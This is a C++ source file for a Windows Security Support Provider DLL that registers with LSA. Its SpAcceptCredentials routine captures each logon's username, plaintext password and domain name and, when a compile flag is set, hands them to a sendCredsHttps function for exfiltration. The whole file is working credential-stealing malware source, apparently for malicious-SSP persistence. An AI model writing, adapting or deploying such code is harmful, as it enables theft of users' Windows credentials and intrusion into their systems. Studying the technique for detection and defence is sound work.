// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include "ssp.h"

#pragma comment(lib, "Secur32.lib")

NTSTATUS NTAPI SpInitialize(ULONG_PTR PackageId, PSECPKG_PARAMETERS Parameters, PLSA_SECPKG_FUNCTION_TABLE FunctionTable) { return 0; }
NTSTATUS NTAPI SpShutDown(void) { return 0; }

NTSTATUS NTAPI SpGetInfo(PSecPkgInfoW PackageInfo)
{
	PackageInfo->Name          = (SEC_WCHAR*)SSP_NAME;
	PackageInfo->Comment       = (SEC_WCHAR*)SSP_COMMENT;
	PackageInfo->fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
	PackageInfo->wRPCID        = SECPKG_ID_NONE;
	PackageInfo->cbMaxToken    = 0;
	PackageInfo->wVersion      = 1;

	return 0;
}

NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRING AccountName, PSECPKG_PRIMARY_CRED PrimaryCredentials, PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
{

	WCHAR username[BUFFER_SIZE]   = {0};
	WCHAR password[BUFFER_SIZE]   = {0};
	WCHAR domainname[BUFFER_SIZE] = {0};

	if(AccountName == NULL || AccountName->Buffer == NULL || PrimaryCredentials == NULL){
		return 0;
	}

	memcpy(username,   AccountName->Buffer,                   AccountName->Length);
	memcpy(password,   PrimaryCredentials->Password.Buffer,   PrimaryCredentials->Password.Length);
	memcpy(domainname, PrimaryCredentials->DomainName.Buffer, PrimaryCredentials->DomainName.Length);

#if HTTPS_EXFILTRATION == 1
	sendCredsHttps(username, password, domainname);
#endif

	return 0;
}

SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
{
	{
		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, (NTSTATUS (*)(struct _SecPkgInfoA *))SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
	}
};

// SpLsaModeInitialize is called by LSA for each registered Security Package
__declspec(dllexport) NTSTATUS NTAPI SpLsaModeInitialize(ULONG LsaVersion, PULONG PackageVersion, PSECPKG_FUNCTION_TABLE * ppTables, PULONG pcTables)
{
	*PackageVersion = SECPKG_INTERFACE_VERSION;
	*ppTables       = SecurityPackageFunctionTable;
	*pcTables       = 1;
	return 0;
}